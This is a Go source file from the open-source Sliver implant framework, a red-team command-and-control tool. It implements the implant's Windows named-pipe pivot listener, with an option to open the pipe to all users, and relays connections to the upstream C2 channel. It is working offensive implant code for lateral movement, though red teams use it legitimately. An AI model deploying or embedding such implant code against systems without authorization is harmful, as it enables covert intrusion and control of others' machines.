package pivots

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"strings"
	"sync"
	"time"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/lesnuages/go-winio"
)

const PipeAllowAllAccess = 0

var (
	namedpipePivotReadDeadline  = 10 * time.Second
	namedpipePivotWriteDeadline = 10 * time.Second
)

// CreateNamedPipePivotListener - Starts a named pipe listener
func CreateNamedPipePivotListener(address string, upstream chan<- *pb.Envelope, opts ...bool) (*PivotListener, error) {
	fullName := "\\\\.\\pipe\\" + strings.TrimPrefix(address, "\\\\.\\pipe\\")
	sd := ""
	if len(opts) > 0 {
		if opts[PipeAllowAllAccess] {
			sd = "D:(A;;0x1f019f;;;WD)" // open to all
		}
	}
	ln, err := winio.ListenPipe(fullName, &winio.PipeConfig{
		SecurityDescriptor: sd,
		RemoteClientMode:   true,
	})
	// {{if .Config.Debug}}
	log.Printf("Listening on named pipe %s", fullName)
	// {{end}}
	if err != nil {
		return nil, err
	}
	pivotLn := &PivotListener{
		ID:               ListenerID(),
		Type:             pb.PivotType_NamedPipe,
		Listener:         ln,
		PivotConnections: &sync.Map{},
		BindAddress:      fullName,
		Upstream:         upstream,
		Options:          opts,
	}
	go namedPipeAcceptConnections(pivotLn)
	return pivotLn, nil
}

func namedPipeAcceptConnections(pivotListener *PivotListener) {
	for {
		conn, err := pivotListener.Listener.Accept()
		if err != nil {
			continue
		}
		// handle connection like any other net.Conn
		pivotConn := &NetConnPivot{
			conn:          conn,
			readMutex:     &sync.Mutex{},
			writeMutex:    &sync.Mutex{},
			readDeadline:  namedpipePivotReadDeadline,
			writeDeadline: namedpipePivotWriteDeadline,
			upstream:      pivotListener.Upstream,
			Downstream:    make(chan *pb.Envelope),
		}
		go pivotConn.Start(pivotListener.PivotConnections)
	}
}
